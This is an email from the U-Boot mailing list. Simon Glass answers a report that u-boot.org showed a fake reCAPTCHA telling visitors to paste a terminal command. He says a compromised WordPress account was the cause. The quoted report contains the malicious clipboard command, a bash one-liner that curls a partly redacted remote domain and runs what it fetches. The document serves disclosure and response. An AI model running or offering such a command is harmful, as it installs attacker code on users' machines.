Return-Path: <u-boot-bounces@lists.denx.de>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from phobos.denx.de (phobos.denx.de [85.214.62.61])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id A2836EC1117
	for <u-boot@archiver.kernel.org>; Mon, 23 Feb 2026 17:51:23 +0000 (UTC)
Received: from h2850616.stratoserver.net (localhost [IPv6:::1])
	by phobos.denx.de (Postfix) with ESMTP id 1F0A483C6E;
	Mon, 23 Feb 2026 18:51:19 +0100 (CET)
Authentication-Results: phobos.denx.de; dmarc=pass (p=none dis=none) header.from=chromium.org
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=u-boot-bounces@lists.denx.de
Authentication-Results: phobos.denx.de;
	dkim=pass (1024-bit key; unprotected) header.d=chromium.org header.i=@chromium.org header.b="WZA28Rr+";
	dkim-atps=neutral
Received: by phobos.denx.de (Postfix, from userid 109)
 id BCE2F83DAE; Mon, 23 Feb 2026 18:51:17 +0100 (CET)
Received: from mail-ed1-x530.google.com (mail-ed1-x530.google.com
 [IPv6:2a00:1450:4864:20::530])
 (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits))
 (No client certificate requested)
 by phobos.denx.de (Postfix) with ESMTPS id 8E3CF80077
 for <u-boot@lists.denx.de>; Mon, 23 Feb 2026 18:51:15 +0100 (CET)
Authentication-Results: phobos.denx.de;
 dmarc=pass (p=none dis=none) header.from=chromium.org
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=sjg@chromium.org
Received: by mail-ed1-x530.google.com with SMTP id
 4fb4d7f45d1cf-65baa72399fso6105911a12.0
 for <u-boot@lists.denx.de>; Mon, 23 Feb 2026 09:51:15 -0800 (PST)
ARC-Seal: i=1; a=rsa-sha256; t=1771869075; cv=none;
 d=google.com; s=arc-20240605;
 b=Z9QE9QA+bzwdq96D6dDyUWpBGWv5dD7H+M7gpyZiOG0mpDlS1zUaP2ctopvN5tQuc3
 FrEf8P+5m7d4LAbfT8XffLrDG1JqeFP4BCrWgU/7xfkXF9mMbcDzyOx+TaMAD4fTozyE
 KysCgjS19BXL3rGAfRw0KU32oGbQ78o/+rmWJ7kPYvQ0O2xobtxOE+C127lnPPf4jpj9
 qd9uCBcG9XK4vV6cNN1s/3gub6vj5AV+QwmcehkGdMQFgBZiAkgc3u/IQVG9s0ncZ4XC
 UJLD2nbINuL0u017e3QD8Wr5YkscF1YCNIBFeHh10pIZNfOI9QwUQtKNNsVhMKK/bseE
 O+9g==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com;
 s=arc-20240605; 
 h=content-transfer-encoding:cc:to:subject:message-id:date:from
 :in-reply-to:references:mime-version:dkim-signature;
 bh=OsssbHSMNxjtli7Km/HBqwcngJoqnI4yZUFd5hQozx8=;
 fh=Bw3R32rnTkQn8vvgFY5nSfDbdPWtZG0eQfExQZmr/OM=;
 b=bM334FV8HOSyZKt4LIMSRDJFnJK89FW4bvk2W2VqI3uB7EsVvNYyacWYGmgxfHLLwx
 fk7P6iDzDfaEeoGAnl3BV8JuGHmIvrqCCvj8O6+hbtl5weyYnbHhwjf2dvSYnvSau7pd
 uMSTd/rlTXZ/DVXwS6rc6AyRoC3JnZ16xPVDnX0QNvmsSn0BCby9qu50K4cqS43xtnVz
 kpVyUc69t/iQfLX2EXpMgKhFOXZ9oVgK5k8Pj1DKh8q8X5oxAxqqC1MRjBXHqRN0vISq
 T440rzNT5GiYf/gdLn/FEF1sgivC2iVIhXN8OeOebL/5o4gwhL8sNMShukOfqsj8ZR2e
 3ZGg==; darn=lists.denx.de
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=chromium.org; s=google; t=1771869075; x=1772473875; darn=lists.denx.de;
 h=content-transfer-encoding:cc:to:subject:message-id:date:from
 :in-reply-to:references:mime-version:from:to:cc:subject:date
 :message-id:reply-to;
 bh=OsssbHSMNxjtli7Km/HBqwcngJoqnI4yZUFd5hQozx8=;
 b=WZA28Rr+pfjCOYYYx9CHC9iNEGDACKBo2dNlVrRNkCKpmTcl95NMLxxz1iKz/Jokkz
 1WEaqiPAAxDIzJBwC6CWn6U7jJIzPiZt2W92qxV+FbovG+5iT5UXgiWlG7Fctpy4z507
 Q8xe21iF+Fx3KW7GdNBgbJXxmMbiMsY5lYW74=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20230601; t=1771869075; x=1772473875;
 h=content-transfer-encoding:cc:to:subject:message-id:date:from
 :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
 :to:cc:subject:date:message-id:reply-to;
 bh=OsssbHSMNxjtli7Km/HBqwcngJoqnI4yZUFd5hQozx8=;
 b=iv+/I/yVjrV1Zuh5Fa2tklPLmfg8510RU1hb8kiIaoZdTIDNFiOzRb+6VI9B+kS44m
 1pNKJIU6vmPjZrsHaqLBYHUHoXq9ImxzfaMejw7Virmc9SE7k8VxLG6KjJuVGTQhKNvI
 0achLkvTZRqed0D/1spdpuqZh0I/Nz7yku38s5QHSWrCxeojsBwbxgn2Iqx/T2EfwfXM
 xYZigKTKgj3b5d/JYi0JhOTkZguIeedOHfdL/3guE77fA4c4vtUqGcfzlSwIsm0V/xmM
 JtJ6ybsTlrSXtqBiL9uUxOunpxJKYAwoeQxeRs8EbwkhYNqCtlqw7yxUGVULKU8cEiNF
 xQ8g==
X-Gm-Message-State: AOJu0YwFqoQH1odD1qtbDK5iAxFVqjfOUvQZnV8A8Qbj7Tawj88HdDJ1
 WdQVsxxsoAJlNypM4mIPr6L6e7C/BZnTCz3sEmGQNXOo5CyuZaR9TZvtqCZrwTPxOQPh7FWf2G8
 YU4mmPlRLah13fQgCE4rAhnH2Ob2Wyu7kC1+V9QfK7Nhr/PyEIF0=
X-Gm-Gg: ATEYQzyam3ASlmM7pPe6GvxgsJsrPQyIoSjFUu5x3Jwmm/4Dxbwoo3y/OCWjLKcpcSt
 vNItj/bdAlmHrOrGkHV1ursMNyZ2dKZ9nOWrvuRpHRYzP/hfXykylZXa0o3qNm3m+zHLZ4uSMHd
 PfMCwGMtcFc4nWZLt8Ygmzt1luOcmg90ZpsIjiBqDwfdCMN3eM5ojl6hZIf/A1US9+NxYPIT6y4
 mvcak9Yp4DFdw7cwZYzO+UwT2k0ffLOOFzvXQVnZVSu1YkEcQmTwBE3sV+jBo154oLHV+SYIeSm
 6AmOMw==
X-Received: by 2002:a05:6402:50d2:b0:658:c1b0:1501 with SMTP id
 4fb4d7f45d1cf-65ea4f0ae39mr5178939a12.31.1771869074950; Mon, 23 Feb 2026
 09:51:14 -0800 (PST)
MIME-Version: 1.0
References: <086E4FCB-379D-491A-A6DB-3CDC48775680@mkukri.xyz>
In-Reply-To: <086E4FCB-379D-491A-A6DB-3CDC48775680@mkukri.xyz>
From: Simon Glass <sjg@chromium.org>
Date: Mon, 23 Feb 2026 10:51:00 -0700
X-Gm-Features: AaiRm52aSqsbqfOJBEt-jZe8sKJ9N1UprPI8yDa6p6QYkBEBEwJSAeB6dAe_V9U
Message-ID: <CAFLszThVSQZMKdrc2kwynso8K0cwj5TjZtAatASGLU4RQ1pFcA@mail.gmail.com>
Subject: Re: U-boot.org is spreading malware
To: Mate Kukri <km@mkukri.xyz>
Cc: u-boot@lists.denx.de
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-BeenThere: u-boot@lists.denx.de
X-Mailman-Version: 2.1.39
Precedence: list
List-Id: U-Boot discussion <u-boot.lists.denx.de>
List-Unsubscribe: <https://lists.denx.de/options/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=unsubscribe>
List-Archive: <https://lists.denx.de/pipermail/u-boot/>
List-Post: <mailto:u-boot@lists.denx.de>
List-Help: <mailto:u-boot-request@lists.denx.de?subject=help>
List-Subscribe: <https://lists.denx.de/listinfo/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=subscribe>
Errors-To: u-boot-bounces@lists.denx.de
Sender: "U-Boot" <u-boot-bounces@lists.denx.de>
X-Virus-Scanned: clamav-milter 0.103.8 at phobos.denx.de
X-Virus-Status: Clean

Hi Mate,

On Mon, 23 Feb 2026 at 03:02, Mate Kukri <km@mkukri.xyz> wrote:
>
> Dear Maintainers,
>
> U-Boot.org <http://u-boot.org/> seems to be trying to social engineer vis=
itors into executing potentially malicious code.
>
> The website presents a seemingly fake re-Captcha upon visiting, which aft=
er ticking the box instructs the user to open their terminal and paste and =
execute a command from the clipboard for =E2=80=9Cverification".
>
> Said command curl-s some text from a network server and runs it as a bash=
 command.
>
> I have not done much analysis on the exact behaviour of the payload, but =
social engineering users into executing arbitrary local payload is not an a=
cceptable way of doing web visitor verification.
>
> An example of the clipboard payload I am told to execute (but did not) is=
 (sub XXXXXXXX with microzen)
> /bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL 'tl5mltkq.XXXXXXXX.digit=
al/?=3Dcheck&&actmn=3DgTGzPBzHSGwagnVq')"; echo ""BotGuard: Answer the prot=
ector challenge. Ref: 15978

Thanks for the report. An old wordpress account was compromised. It
has been deleted and various measures have been put in place to ensure
there is no repeat. We can share more detail privately to those
interested.

Regards,
SImon
